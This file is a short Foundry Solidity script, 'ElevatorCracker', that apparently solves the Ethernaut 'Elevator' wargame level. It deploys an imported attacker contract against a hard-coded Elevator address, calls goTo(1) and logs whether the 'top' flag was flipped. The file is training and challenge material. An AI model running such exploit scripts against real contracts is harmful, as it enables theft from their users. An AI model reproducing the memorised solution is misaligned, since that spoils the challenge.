// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.4.22 <0.9.0;
import "../src/Solutions/BuildingWithElevator.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract ElevatorCracker is Script {
    BuildingWithElevator buildingWithElevator;
    Elevator elevator = Elevator(0x0092D6daD0B8d35d9B782FceB7c5C4B567aB8D29);

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        buildingWithElevator = new BuildingWithElevator(
            0x0092D6daD0B8d35d9B782FceB7c5C4B567aB8D29
        );
        buildingWithElevator.goTo(1);
        bool top = elevator.top();
        console.log(top);
        vm.stopBroadcast();
    }
}
